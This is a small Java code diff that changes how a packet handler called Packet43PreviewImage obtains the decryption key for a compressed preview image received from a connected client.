@@ -29,7 +29,7 @@ public class Packet43PreviewImage extends AbstractIncomingPacket {
 
 			slave.getDataInputStream().readFully(buffer);
 
-			buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());
+			buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getKey());
 
 			BufferedImage img = ImageUtils.decodeImage(buffer);
 			imageGraphics.drawImage(img, 0, 0, w, h, null);
